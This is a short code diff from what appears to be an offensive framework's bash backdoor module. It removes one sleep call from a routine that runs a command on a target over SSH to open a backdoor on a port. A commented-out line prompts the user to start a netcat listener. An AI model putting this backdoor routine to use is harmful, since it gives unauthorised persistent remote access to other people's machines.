@@ -36,7 +36,6 @@ class Bash(Backdoor):
         #input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))
 
         self.listen(target.pword)
-        time.sleep(.25)
         target.ssh.exec_command(self.get_command())
         print(GOOD + "Bash Backdoor on port " + str(port) + " attempted.")
         for mod in self.modules.keys():
